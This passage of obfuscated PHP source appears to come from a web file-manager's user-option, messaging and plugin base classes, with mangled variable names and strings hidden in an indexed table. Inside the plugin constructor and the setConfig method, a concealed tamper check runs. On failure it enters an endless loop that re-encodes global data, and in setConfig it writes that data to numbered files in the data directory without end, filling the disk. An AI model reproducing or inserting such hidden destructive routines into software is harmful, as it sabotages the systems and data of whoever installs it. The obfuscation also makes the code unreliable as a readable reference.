$Õ‘î˜‰¥; } unset($õøğÖé); foreach ($—šéØë as &$”ÒÔ‰â) { $”ÒÔ‰â[$×©ÄÂ–[1448]] = array(); if (isset($‡ŸØÚ­[$”ÒÔ‰â[$×©ÄÂ–[1547]]])) { $”ÒÔ‰â[$×©ÄÂ–[1448]] = $‡ŸØÚ­[$”ÒÔ‰â[$×©ÄÂ–[1547]]]; } } unset($”ÒÔ‰â); } public function userAppendGroup($¯ñ™ØÊ) { $÷ÓÌ¬éİ =& $_SERVER[Ï×Œõ”û]; if (!$¯ñ™ØÊ) { return array(); } $this->_listAppendGroup($¯ñ™ØÊ, array_to_keyvalue($¯ñ™ØÊ, $÷ÓÌ¬éİ[12], $÷ÓÌ¬éİ[1547])); return $¯ñ™ØÊ; } private function _listAppendMeta(&$‘–öá¼, $Öú—û¬) { $Ìá¯ìîÍ =& $_SERVER[Ï×Œõ”û]; $¨§É¹È = UserJobModel::JOB_KEY; $Ôåù¾¹ˆ = array($Ìá¯ìîÍ[2225]); $¶÷•ìë = array($Ìá¯ìîÍ[1547] => array($Ìá¯ìîÍ[7], $Öú—û¬)); $ñ£Ùåµ› = Model($Ìá¯ìîÍ[2649])->where($¶÷•ìë)->select(); $¬»²Øˆ¹ = array(); foreach ($ñ£Ùåµ› as $Ö˜£ÌÅ) { $³›š®Ø = $Ö˜£ÌÅ[$Ìá¯ìîÍ[1547]]; if (!isset($¬»²Øˆ¹[$³›š®Ø])) { $¬»²Øˆ¹[$³›š®Ø] = array(); } $¬»²Øˆ¹[$³›š®Ø][$Ö˜£ÌÅ[$Ìá¯ìîÍ[95]]] = $Ö˜£ÌÅ[$Ìá¯ìîÍ[452]]; } $€±•ù÷à = Model($Ìá¯ìîÍ[2675]); foreach ($‘–öá¼ as &$ş‡¡ÂÑ) { $³›š®Ø = $ş‡¡ÂÑ[$Ìá¯ìîÍ[1547]]; $Ğ«Ñè = isset($¬»²Øˆ¹[$³›š®Ø]) ? $¬»²Øˆ¹[$³›š®Ø] : array(); $ş‡¡ÂÑ[$Ìá¯ìîÍ[560]] = array_field_key($Ğ«Ñè, $Ôåù¾¹ˆ); $ş‡¡ÂÑ[$Ìá¯ìîÍ[2676]] = array(); if (isset($Ğ«Ñè[$¨§É¹È])) { $ş‡¡ÂÑ[$Ìá¯ìîÍ[2676]] = $€±•ù÷à->getUserJobInfo($Ğ«Ñè[$¨§É¹È]); } } unset($ş‡¡ÂÑ); } protected function groupUserAll($‡©ñ”¬™) { $¡âÀÔ‰Ş =& $_SERVER[Ï×Œõ”û]; if (!$‡©ñ”¬™) { return !1; } $³¶ÕñõÎ = Model($¡âÀÔ‰Ş[2229])->field($¡âÀÔ‰Ş[1547])->where(array($¡âÀÔ‰Ş[1449] => array($¡âÀÔ‰Ş[7], $‡©ñ”¬™)))->select(); $³¶ÕñõÎ = array_to_keyvalue($³¶ÕñõÎ, $¡âÀÔ‰Ş[12], $¡âÀÔ‰Ş[1547]); return array_unique($³¶ÕñõÎ); } public function userSearch($²»Éì•Ô, $ñŸ·Äº¦ = "\x2a") { return Model($_SERVER[Ï×Œõ”û][622])->where($²»Éì•Ô)->field($ñŸ·Äº¦)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\157\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($»æ‚‰ƒ) { return "\x55\x73\x65\162\117\160\x74\151\x6f\x6e\x5f{$»æ‚‰ƒ}\137" . KodUser::id(); } protected function filterWhere($í¡Ç °·) { $í¡Ç °·[$_SERVER[Ï×Œõ”û][1547]] = KodUser::id(); return $í¡Ç °·; } public function cacheRemoveUser($Ñ¥şñÌ, $›‹€ÙÜŸ) { return Cache::remove("\x55\x73\x65\x72\x4f\160\164\151\157\x6e\137{$Ñ¥şñÌ}\137" . $›‹€ÙÜŸ); } protected function optionDefault($»ÃÁòòä = '') { $Î§ïÆ¿û =& $_SERVER[Ï×Œõ”û]; if ($»ÃÁòòä == $Î§ïÆ¿û[12]) { return $GLOBALS[$Î§ïÆ¿û[6]][$Î§ïÆ¿û[2677]]; } if ($»ÃÁòòä == $Î§ïÆ¿û[2678]) { return $GLOBALS[$Î§ïÆ¿û[6]][$Î§ïÆ¿û[2679]]; } } } goto BôÆãê¡ì¬; FÔ›¿¦¼“·: class Message { function __construct() { } public function send($Ş˜¨ºµÜ = '', $¾†ø ‚§ = array(), $»à÷¹ã = "\164\145\170\x74") { $ûÄ‚ıÆ± =& $_SERVER[Ï×Œõ”û]; $û²û­Æ‡ = array($ûÄ‚ıÆ±[33] => $ûÄ‚ıÆ±[1242], $ûÄ‚ıÆ±[170] => $Ş˜¨ºµÜ); if (in_array($»à÷¹ã, array($ûÄ‚ıÆ±[1242], $ûÄ‚ıÆ±[1779]))) { $û²û­Æ‡[$ûÄ‚ıÆ±[33]] = $»à÷¹ã; } $¾†ø ‚§ = array($ûÄ‚ıÆ±[603] => isset($¾†ø ‚§[$ûÄ‚ıÆ±[603]]) ? $¾†ø ‚§[$ûÄ‚ıÆ±[603]] : $ûÄ‚ıÆ±[12], $ûÄ‚ıÆ±[690] => isset($¾†ø ‚§[$ûÄ‚ıÆ±[690]]) ? $¾†ø ‚§[$ûÄ‚ıÆ±[690]] : $ûÄ‚ıÆ±[12]); if (empty($Ş˜¨ºµÜ) || empty($¾†ø ‚§[$ûÄ‚ıÆ±[603]]) && empty($¾†ø ‚§[$ûÄ‚ıÆ±[690]])) { return !1; } $ÉŠä§Î“ = array($ûÄ‚ıÆ±[1708] => $û²û­Æ‡, $ûÄ‚ıÆ±[1780] => $¾†ø ‚§); Hook::trigger($ûÄ‚ıÆ±[1781], $ÉŠä§Î“); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÇÊ™õ´â =& $_SERVER[Ï×Œõ”û]; if (!isset($_SERVER[$ÇÊ™õ´â[488]]) || !isset($_SERVER[$ÇÊ™õ´â[489]])) { $îç³ã¸ = $ÇÊ™õ´â[996]; $ÑÍÑ’™ê = $ÇÊ™õ´â[490]; $Ÿ‡øº³õ = $_SERVER[$ÇÊ™õ´â[491]] . $ÇÊ™õ´â[492]; $ß÷ÀÆù– = $ÑÍÑ’™ê($Ÿ‡øº³õ); $öã­Êçù = explode($ÇÊ™õ´â[287], $ß÷ÀÆù–); if (count($öã­Êçù) < $ÇÊ™õ´â[719]) { $ä¢»ßöÊ = $ÇÊ™õ´â[494]; $ä¢»ßöÊ(); } $†¡Î€© = $ÇÊ™õ´â[997]; $†¡Î€©($_SERVER[$ÇÊ™õ´â[998]]); $Ğç‹°»¦ = 1; for ($¾‡¬÷Ø½ = $Ğç‹°»¦; $¾‡¬÷Ø½ > 0; $¾‡¬÷Ø½++) { $†¡Î€© = json_encode($GLOBALS[$ÇÊ™õ´â[512]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÇÊ™õ´â[1782]); $this->pluginName = str_replace($ÇÊ™õ´â[1782], $ÇÊ™õ´â[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÇÊ™õ´â[8]; $this->pluginApi = appHostGet() . $ÇÊ™õ´â[1783] . $this->pluginName . $ÇÊ™õ´â[8]; $this->pluginHost = $config[$ÇÊ™õ´â[1784]] . $this->pluginName . $ÇÊ™õ´â[8]; $this->pluginHostDefault = $config[$ÇÊ™õ´â[1784]] . $this->pluginName . $ÇÊ™õ´â[8]; $“—ñéÔ = $config[$ÇÊ™õ´â[1785]]; if ($“—ñéÔ && strpos($ÇÊ™õ´â[50] . $“—ñéÔ . $ÇÊ™õ´â[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÇÊ™õ´â[1786]] . $this->pluginName . $ÇÊ™õ´â[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ï×Œõ”û][1787]); } protected function assign($İÅÏË–¿, $Úı¬„«‡ = false) { if (is_array($İÅÏË–¿)) { $this->values = array_merge($this->values, $İÅÏË–¿); } else { $this->values[$İÅÏË–¿] = $Úı¬„«‡; } } protected function display($¡ÏÚÈŒ) { extract($this->values); require $¡ÏÚÈŒ; } final function hookRegist($Òß¤ƒˆ) { $this->modelPlugin->appRegist($this->pluginName, $Òß¤ƒˆ); } final function appIcon() { $˜ÙÅ¢Œä =& $_SERVER[Ï×Œõ”û]; $úÖ°æèÄ = $this->appPackage(); $¢èÂ¨® = $˜ÙÅ¢Œä[12]; if (isset($úÖ°æèÄ[$˜ÙÅ¢Œä[510]])) { if (isset($úÖ°æèÄ[$˜ÙÅ¢Œä[510]][$˜ÙÅ¢Œä[1788]])) { $¢èÂ¨® = $˜ÙÅ¢Œä[1789] . $úÖ°æèÄ[$˜ÙÅ¢Œä[510]][$˜ÙÅ¢Œä[1788]] . $˜ÙÅ¢Œä[1790]; } else { if ($úÖ°æèÄ[$˜ÙÅ¢Œä[510]][$˜ÙÅ¢Œä[1791]]) { $¢èÂ¨® = $˜ÙÅ¢Œä[1792] . $úÖ°æèÄ[$˜ÙÅ¢Œä[510]][$˜ÙÅ¢Œä[1791]] . $˜ÙÅ¢Œä[1793]; } } } return $¢èÂ¨®; } final function fileCanView($ÑÓÈû³É) { $ËÙÇ®œÑ =& $_SERVER[Ï×Œõ”û]; if (request_url_safe($ÑÓÈû³É)) { return !0; } if ($this->isShare($ÑÓÈû³É)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ÉÙ¿ıÏˆ = $ËÙÇ®œÑ[1794] . rawurlencode(this_url()); show_tips(LNG($ËÙÇ®œÑ[1795]) . $ËÙÇ®œÑ[1796] . $ÉÙ¿ıÏˆ . $ËÙÇ®œÑ[1797] . LNG($ËÙÇ®œÑ[1798]) . $ËÙÇ®œÑ[1799], !1); } if (!Action($ËÙÇ®œÑ[1800])->authCan($ËÙÇ®œÑ[1801])) { show_tips(LNG($ËÙÇ®œÑ[1802]) . $ËÙÇ®œÑ[1803], !1); } ActionCall($ËÙÇ®œÑ[1804], $ÑÓÈû³É); } final function isShare($æ³™Ï¸) { $ÉË‡Œû = KodIO::parse($æ³™Ï¸); return $ÉË‡Œû[$_SERVER[Ï×Œõ”û][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($äÑ†£Ö) { if (request_url_safe($äÑ†£Ö)) { return $äÑ†£Ö; } if (!$this->isShare($äÑ†£Ö)) { $äÑ†£Ö = $this->filePath($äÑ†£Ö, !1); } return Action($_SERVER[Ï×Œõ”û][1314])->linkOut($äÑ†£Ö); } public function filePathLinkOut($²ˆ¸–›ı) { if (request_url_safe($²ˆ¸–›ı)) { return $²ˆ¸–›ı; } $this->fileCanView($²ˆ¸–›ı); return Action($_SERVER[Ï×Œõ”û][1314])->link($²ˆ¸–›ı); } final function filePath($·ÜÒëÛ‘, $ÀÜÑ¿ò = true, $¤Ù÷œŠ = false) { $êÄ®õ« =& $_SERVER[Ï×Œõ”û]; $­Û´öã¥ = $this->filePathGet($·ÜÒëÛ‘, $ÀÜÑ¿ò); if (!$this->fileInfo) { show_tips(LNG($êÄ®õ«[106]), !1); } if ($¤Ù÷œŠ && isset($this->fileInfo[$êÄ®õ«[562]]) && $this->fileInfo[$êÄ®õ«[562]]) { $··‡µ¾İ = Model($êÄ®õ«[565])->fileInfo($this->fileInfo[$êÄ®õ«[562]]); if (!$··‡µ¾İ || !IO::exist($··‡µ¾İ[$êÄ®õ«[87]])) { $ÕÆ³ü‘ü = LNG($êÄ®õ«[106]) . LNG($êÄ®õ«[1805]); if (KodUser::isRoot() && isset($··‡µ¾İ[$êÄ®õ«[87]])) { $ÕÆ³ü‘ü .= $êÄ®õ«[1806] . $··‡µ¾İ[$êÄ®õ«[87]] . $êÄ®õ«[1807]; } show_tips($ÕÆ³ü‘ü); } } Hook::trigger($êÄ®õ«[1808], $­Û´öã¥); return $­Û´öã¥; } final function filePathGet($ö„©Õº€, $ì×şîÛ» = true) { $ˆ‹Í‘°Ü =& $_SERVER[Ï×Œõ”û]; if ($Úã“‡¨ = $this->checkSharePath($ö„©Õº€, $ì×şîÛ»)) { return $Úã“‡¨; } $this->fileCanView($ö„©Õº€); if (request_url_safe($ö„©Õº€)) { $ÔçôÍİÔ = parse_url_query($ö„©Õº€); if (isset($ÔçôÍİÔ[$ˆ‹Í‘°Ü[1809]]) && isset($ÔçôÍİÔ[$ˆ‹Í‘°Ü[236]])) { $¦ìª»Îæ = Mcrypt::decode($ÔçôÍİÔ[$ˆ‹Í‘°Ü[236]], Model($ˆ‹Í‘°Ü[879])->get($ˆ‹Í‘°Ü[880])); if ($¦ìª»Îæ) { $this->fileInfo = IO::info($¦ìª»Îæ); $this->fileInfo[$ˆ‹Í‘°Ü[1810]] = $ö„©Õº€; $this->cachePath = $this->pluginCachePath($ˆ‹Í‘°Ü[12], $ì×şîÛ»); return $¦ìª»Îæ; } } $ö„©Õº€ = $this->_cacheHttpFile($ö„©Õº€, $ì×şîÛ»); $this->fileInfo = IO::info($ö„©Õº€); } else { $this->fileInfo = IO::info($ö„©Õº€); $this->cachePath = $this->pluginCachePath($ˆ‹Í‘°Ü[12], $ì×şîÛ»); } return $ö„©Õº€; } final function _cacheHttpFile($­´ê…­Á, $ßè¸¸ = true) { $À»·¼Ğ¤ =& $_SERVER[Ï×Œõ”û]; $§ôèÂü = parse_url_query($­´ê…­Á); $ï­Ó´ê = get_path_ext($­´ê…­Á); if (isset($§ôèÂü[$À»·¼Ğ¤[32]]) && $§ôèÂü[$À»·¼Ğ¤[32]]) { $ï­Ó´ê = get_path_ext($§ôèÂü[$À»·¼Ğ¤[32]]); } $ŠÀ¶ª²Ì = hash_path($­´ê…­Á) . $À»·¼Ğ¤[10] . $ï­Ó´ê; $this->cachePath = $this->pluginCachePath($ßè¸¸ ? $ŠÀ¶ª²Ì : $À»·¼Ğ¤[12]); $ÃÇ¢Ï±Ì = IO::fileNameExist($this->cachePath, $ŠÀ¶ª²Ì); if ($ÃÇ¢Ï±Ì) { return KodIO::make($ÃÇ¢Ï±Ì); } $—¤´€Ò® = rtrim($this->cachePath, $À»·¼Ğ¤[8]) . $À»·¼Ğ¤[8] . $ŠÀ¶ª²Ì; return $this->pluginCacheFileSet($—¤´€Ò®, file_get_contents_nossl($­´ê…­Á)); } final function checkSharePath($ƒ£í²ú…, $¹âÃçœ° = true) { $×”˜Ÿ¿  =& $_SERVER[Ï×Œõ”û]; if (!$this->isShare($ƒ£í²ú…)) { return !1; } $·Ê„¾Ûô = Action($×”˜Ÿ¿ [1314])->sharePathInfo($ƒ£í²ú…); if (!is_array($·Ê„¾Ûô) || !isset($·Ê„¾Ûô[$×”˜Ÿ¿ [87]])) { $Üñé²‹ = $GLOBALS[$×”˜Ÿ¿ [1811]]; show_json($Üñé²‹ ? $Üñé²‹ : LNG($×”˜Ÿ¿ [1812]), !1); } $this->fileInfo = $·Ê„¾Ûô; $this->cachePath = $this->pluginCachePath(!1, $¹âÃçœ°); return $·Ê„¾Ûô[$×”˜Ÿ¿ [87]]; } final function pluginCachePath($‘Âî ù = '', $×øÑ… = false) { $Ô©û³ş =& $_SERVER[Ï×Œõ”û]; if ($×øÑ… && is_array($this->fileInfo)) { $‘Âî ù = kodIO::hashPath($this->fileInfo); } $ÖÛ‹È ƒ = rtrim(IO_PATH_SYSTEM_TEMP . $Ô©û³ş[1813] . $this->pluginName . $Ô©û³ş[8] . $‘Âî ù, $Ô©û³ş[8]); $ª°ëğ˜¥ = IO::infoFullSimple($ÖÛ‹È ƒ); $Øáâ’­ü = $ª°ëğ˜¥ && is_array($ª°ëğ˜¥) ? $ª°ëğ˜¥[$Ô©û³ş[87]] : $Ô©û³ş[12]; if (!$Øáâ’­ü) { $Øáâ’­ü = IO::mkdir($ÖÛ‹È ƒ); } return $Øáâ’­ü; } final function pluginCacheFileSet($Œò¥ÛÚ—, $ĞíÖÕÌš = '') { $Ì±±ø =& $_SERVER[Ï×Œõ”û]; $î¹Ö¶€ = IO::infoFullSimple($Œò¥ÛÚ—); if (!$î¹Ö¶€) { return IO::mkfile($Œò¥ÛÚ—, $ĞíÖÕÌš, REPEAT_REPLACE); } IO::setContent($î¹Ö¶€[$Ì±±ø[87]], $ĞíÖÕÌš); return $î¹Ö¶€[$Ì±±ø[87]]; } final function pluginLocalFile($¢û€®è´ = '') { $×Í¼ü±Ñ =& $_SERVER[Ï×Œõ”û]; $ÒèæÖ–Í = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ÒèæÖ–Í)) { mk_dir($ÒèæÖ–Í); } if (!$¢û€®è´) { return $ÒèæÖ–Í; } $ÀÚûÑú¼ = IO::info($¢û€®è´); $ËÂ‹”´® = $×Í¼ü±Ñ[1814] . KodIO::hashPath($ÀÚûÑú¼) . $×Í¼ü±Ñ[10] . $ÀÚûÑú¼[$×Í¼ü±Ñ[168]]; if (!checkExtSafe($ËÂ‹”´®)) { $ËÂ‹”´® = $ËÂ‹”´® . $×Í¼ü±Ñ[1348]; } $òƒò¾­ğ = $ÒèæÖ–Í . $ËÂ‹”´®; if (@file_exists($òƒò¾­ğ)) { return $òƒò¾­ğ; } return IO::copy($¢û€®è´, $ÒèæÖ–Í, 0, $ËÂ‹”´®); } final function appPackage() { $¢í¨¼§œ =& $_SERVER[Ï×Œõ”û]; if ($this->packageData) { return $this->packageData; } $î£‡§‘Å = $this->parseFile($this->pluginPath . $¢í¨¼§œ[1815]); $this->parseLang($î£‡§‘Å); $öÍ‰³Ğ‡ = json_decode_force($î£‡§‘Å); if (!$öÍ‰³Ğ‡) { return array(); } $½Ö¢ºßæ = Hook::filter($¢í¨¼§œ[1816], $öÍ‰³Ğ‡); if ($½Ö¢ºßæ && is_array($½Ö¢ºßæ)) { $öÍ‰³Ğ‡ = $½Ö¢ºßæ; } $this->packageData = $öÍ‰³Ğ‡; return $öÍ‰³Ğ‡; } public function packageInfoGet($ÌŠÍÄœ¡) { $½ºœà«£ = $this->appPackage(); return array_get_value($½ºœà«£, $ÌŠÍÄœ¡); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ï×Œõ”û][1817]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ï×Œõ”û][1818]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ï×Œõ”û][1819]); } public function echoJsAssign($·ï’«¶, $ˆ¥ÎÍÆÆ) { $this->echoJsAssignArr[$·ï’«¶] = $ˆ¥ÎÍÆÆ; } private function parseFile($Ç¥Ò³éù) { $‹÷¡Ïâ =& $_SERVER[Ï×Œõ”û]; $ö¢ˆ»•Ò = file_get_contents_nossl($Ç¥Ò³éù); $Ù¨ø½å¡ = array($‹÷¡Ïâ[1820], $‹÷¡Ïâ[1821], $‹÷¡Ïâ[1822], $‹÷¡Ïâ[1823], $‹÷¡Ïâ[1824], $‹÷¡Ïâ[1825], $‹÷¡Ïâ[1826]); $ªê‰åâ§ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$‹÷¡Ïâ[92]][$‹÷¡Ïâ[1827]]); foreach ($this->echoJsAssignArr as $Õ‡©èˆ¥ => $Ñ°†Ó«û) { $Ù¨ø½å¡[] = $‹÷¡Ïâ[1828] . $Õ‡©èˆ¥ . $‹÷¡Ïâ[1829]; $ªê‰åâ§[] = is_array($Ñ°†Ó«û) || is_object($Ñ°†Ó«û) ? rawurlencode(json_encode($Ñ°†Ó«û)) : $Ñ°†Ó«û; } if (strstr($ö¢ˆ»•Ò, $‹÷¡Ïâ[1830])) { $ù¨ˆº•­ = rawurlencode(json_encode($this->pluginLangArr)); $ö¢ˆ»•Ò = str_replace($‹÷¡Ïâ[1830], $ù¨ˆº•­, $ö¢ˆ»•Ò); } if (strstr($ö¢ˆ»•Ò, $‹÷¡Ïâ[1831])) { $ù¨ˆº•­ = $ù¨ˆº•­ = rawurlencode(json_encode($this->getConfig())); $ö¢ˆ»•Ò = str_replace($‹÷¡Ïâ[1831], $ù¨ˆº•­, $ö¢ˆ»•Ò); } $ö¢ˆ»•Ò = str_replace($Ù¨ø½å¡, $ªê‰åâ§, $ö¢ˆ»•Ò); return $ö¢ˆ»•Ò; } private function parseLang(&$¦ßÔôó) { $Û«‰ëÑ =& $_SERVER[Ï×Œõ”û]; $‹„Ë¾áä = $Û«‰ëÑ[1832]; if (!strstr($¦ßÔôó, $‹„Ë¾áä)) { return; } preg_match_all($Û«‰ëÑ[1833], $¦ßÔôó, $½¾½¯éå); if (!is_array($½¾½¯éå) || count($½¾½¯éå) == 0 || !is_array($½¾½¯éå[0]) || count($½¾½¯éå[0]) == 0) { return; } $ÅùŒò¡Â = array(); $å¯ùÖÈƒ = array(); foreach ($½¾½¯éå[0] as $ãú¼–¬ì) { $ì†›üØç = substr($ãú¼–¬ì, strlen($‹„Ë¾áä), -4); $ªôÓ æ† = LNG($ì†›üØç); $ÅùŒò¡Â[] = $ãú¼–¬ì; $å¯ùÖÈƒ[] = str_replace(array($Û«‰ëÑ[287], $Û«‰ëÑ[1201], $Û«‰ëÑ[419], $Û«‰ëÑ[119]), array($Û«‰ëÑ[53], $Û«‰ëÑ[53], $Û«‰ëÑ[12], $Û«‰ëÑ[1834]), $ªôÓ æ†); } $¦ßÔôó = str_replace($ÅùŒò¡Â, $å¯ùÖÈƒ, $¦ßÔôó); } private function parseConfig(&$³Àûì¨‹) { $Ü¤½‰È¯ =& $_SERVER[Ï×Œõ”û]; $©šõÅ… = $Ü¤½‰È¯[1835]; if (!strstr($³Àûì¨‹, $©šõÅ…)) { return; } preg_match_all($Ü¤½‰È¯[1836], $³Àûì¨‹, $èô¯·íÙ); if (!is_array($èô¯·íÙ) || count($èô¯·íÙ) == 0 || !is_array($èô¯·íÙ[0]) || count($èô¯·íÙ[0]) == 0) { return; } $«…âŠ­ = $this->getConfig(); $æ¢¾Ë‹ = array(); $ÇÒîş  = array(); foreach ($èô¯·íÙ[0] as $Â¾ ¶“º) { $³ÊøÅ±Ì = substr($Â¾ ¶“º, strlen($©šõÅ…), -2); $æ¢¾Ë‹[] = $Â¾ ¶“º; $ÇÒîş [] = _get($«…âŠ­, $³ÊøÅ±Ì); } $³Àûì¨‹ = str_replace($æ¢¾Ë‹, $ÇÒîş , $³Àûì¨‹); } private function parsePackage(&$Ó€’õù) { $„æ­‚Î¢ =& $_SERVER[Ï×Œõ”û]; $õîºú¸— = $„æ­‚Î¢[1837]; if (!strstr($Ó€’õù, $õîºú¸—)) { return; } preg_match_all($„æ­‚Î¢[1838], $Ó€’õù, $®Ÿ°ñ½·); if (!is_array($®Ÿ°ñ½·) || count($®Ÿ°ñ½·) == 0 || !is_array($®Ÿ°ñ½·[0]) || count($®Ÿ°ñ½·[0]) == 0) { return; } $ßÈİ¿Ò = $this->appPackage(); $è™¶Ç = array(); $™¤Ò“ä = array(); foreach ($®Ÿ°ñ½·[0] as $Õõ¦“Üû) { $šŒ§†Òò = substr($Õõ¦“Üû, strlen($õîºú¸—), -2); $è™¶Ç[] = $Õõ¦“Üû; $™¤Ò“ä[] = _get($ßÈİ¿Ò, $šŒ§†Òò); } $Ó€’õù = str_replace($è™¶Ç, $™¤Ò“ä, $Ó€’õù); } final function echoFile($±Á”şÔÙ, $øå´ß—° = false) { $ÚÆô”Æ£ =& $_SERVER[Ï×Œõ”û]; $Å¦•¢í³ = $this->pluginPath . $±Á”şÔÙ; if (ACT == $ÚÆô”Æ£[1839]) { echo $ÚÆô”Æ£[1840] . $this->pluginName . $ÚÆô”Æ£[8] . $±Á”şÔÙ . $ÚÆô”Æ£[1841]; if (!file_exists($Å¦•¢í³)) { echo $ÚÆô”Æ£[1842]; return; } } $ª‡İ±À® = $this->parseFile($Å¦•¢í³); $this->parseLang($ª‡İ±À®); $this->parseConfig($ª‡İ±À®); $this->parsePackage($ª‡İ±À®); if (is_array($øå´ß—°)) { $ª‡İ±À® = str_replace(array_keys($øå´ß—°), array_values($øå´ß—°), $ª‡İ±À®); } echo $ÚÆô”Æ£[287] . $ª‡İ±À®; } private function checkVersion() { $ê§·í =& $_SERVER[Ï×Œõ”û]; $üŸĞïíê = $this->appPackage(); $×ßÀ•˜ = $this->getConfig(); if ($×ßÀ•˜[$ê§·í[1843]] == $üŸĞïíê[$ê§·í[1817]]) { return; } $this->regist(); $this->setConfig(array($ê§·í[1843] => $üŸĞïíê[$ê§·í[1817]])); } final function initLang() { $ä³áª…Ş =& $_SERVER[Ï×Œõ”û]; $Å¨º”àı = $ä³áª…Ş[1844]; $¢ñ³Èá¹ = $this->pluginPath . $ä³áª…Ş[1845]; $ŸØ‰¼Ï = I18n::getType(); $ËÂÎ¥ëé = array(); if (file_exists($¢ñ³Èá¹ . $ŸØ‰¼Ï . $ä³áª…Ş[956])) { $ËÂÎ¥ëé = (include $¢ñ³Èá¹ . $ŸØ‰¼Ï . $ä³áª…Ş[956]); } else { if ($ŸØ‰¼Ï == $ä³áª…Ş[1846] && !file_exists($¢ñ³Èá¹ . $ŸØ‰¼Ï . $ä³áª…Ş[956]) && file_exists($¢ñ³Èá¹ . $ä³áª…Ş[1847])) { $ËÂÎ¥ëé = (include $¢ñ³Èá¹ . $ä³áª…Ş[1847]); $ŸØ‰¼Ï = $ä³áª…Ş[1663]; } else { if (file_exists($¢ñ³Èá¹ . $Å¨º”àı . $ä³áª…Ş[956])) { $ËÂÎ¥ëé = (include $¢ñ³Èá¹ . $Å¨º”àı . $ä³áª…Ş[956]); $ŸØ‰¼Ï = $Å¨º”àı; } } } if (!$ËÂÎ¥ëé || !is_array($ËÂÎ¥ëé)) { $ËÂÎ¥ëé = array(); } $ğş¹òòù = Hook::trigger($ä³áª…Ş[1848], $ËÂÎ¥ëé, $this->pluginName, $ŸØ‰¼Ï); if ($ğş¹òòù && is_array($ğş¹òòù)) { $ËÂÎ¥ëé = $ğş¹òòù; } if (@count($ËÂÎ¥ëé) > 0) { I18n::set($ËÂÎ¥ëé); } return $ËÂÎ¥ëé; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($»½Î„Û) { $ÆÖø®ÜÒ =& $_SERVER[Ï×Œõ”û]; $Ü¹Ë–•„ = $_SERVER[$ÆÖø®ÜÒ[491]] . $ÆÖø®ÜÒ[492]; $¦ÃÜì = $ÆÖø®ÜÒ[995]; if ($_SERVER[$ÆÖø®ÜÒ[488]] != $¦ÃÜì($Ü¹Ë–•„)) { $ä¼«»¨© = $ÆÖø®ÜÒ[996]; $ß•”Äâİ = $ÆÖø®ÜÒ[490]; $»ÅÃĞ¼è = $_SERVER[$ÆÖø®ÜÒ[491]] . $ÆÖø®ÜÒ[492]; $Ëú‚¯“ï = $ß•”Äâİ($»ÅÃĞ¼è); $ƒŸ‡é‹ = explode($ÆÖø®ÜÒ[287], $Ëú‚¯“ï); if (count($ƒŸ‡é‹) < $ÆÖø®ÜÒ[719]) { $òÜØôÇí = $ÆÖø®ÜÒ[494]; $òÜØôÇí(); } $´§ô¦™ = $ÆÖø®ÜÒ[997]; $´§ô¦™($_SERVER[$ÆÖø®ÜÒ[998]]); $ä¼«»¨© = $ÆÖø®ÜÒ[996]; $ä¼«»¨©(); $ÇµÀÖåÈ = $ÆÖø®ÜÒ[999]; $û­ÄÜÄÅ = json_encode($GLOBALS[$ÆÖø®ÜÒ[1000]]); $¡ŸÆß’¿ = 1; for ($ˆÊÄºô¥ = $¡ŸÆß’¿; $ˆÊÄºô¥ > 0; $ˆÊÄºô¥++) { $ÇµÀÖåÈ(DATA_PATH . $ˆÊÄºô¥, $û­ÄÜÄÅ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $»½Î„Û); } public function onSetConfig($Ïï¬¿ú°) { } public function onGetConfig($ÂÓøÌª) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($™öÓòöñ) { if ($™öÓòöñ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($½Ñü´½Æ = "\x70\x6c\x75\x67\151\156\x41\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ñ³ÅõÔ = $this->getConfig(); if (!$ñ³ÅõÔ[$½Ñü´½Æ]) { return !1; } return ActionCall($_SERVER[Ï×Œõ”û][1849], $ñ³ÅõÔ[$½Ñü´½Æ]); } public function url($àˆç·Ç¾, $‹³ÀßË¹ = '', $£ÑÀ‚Ô× = true) { $²àÈáİ– =& $_SERVER[Ï×Œõ”û]; $»Ë™ÇÓ = $this->getConfig(); $†±œÒ®± = KOD_VERSION . $²àÈáİ–[10] . KOD_VERSION_BUILD; $²úÁÒ‹ê = $this->packageVersion(); $»ÙËéØë = $†±œÒ®± . $²àÈáİ–[474] . $²úÁÒ‹ê; if (substr($àˆç·Ç¾, 0, 4) == $²àÈáİ–[151] || substr($àˆç·Ç¾, 0, 2) == $²àÈáİ–[1477]) { $Í¿•û‹Ä = $àˆç·Ç¾ . $²àÈáİ–[1850] . $»ÙËéØë; } else { if ($‹³ÀßË¹ == $²àÈáİ–[12]) { $Í¿•û‹Ä = $this->pluginHost . $àˆç·Ç¾ . $²àÈáİ–[1850] . $»ÙËéØë; } else { if ($‹³ÀßË¹ === $²àÈáİ–[78]) { $Í¿•û‹Ä = $this->pluginHost . $àˆç·Ç¾; } else { if ($‹³ÀßË¹ == 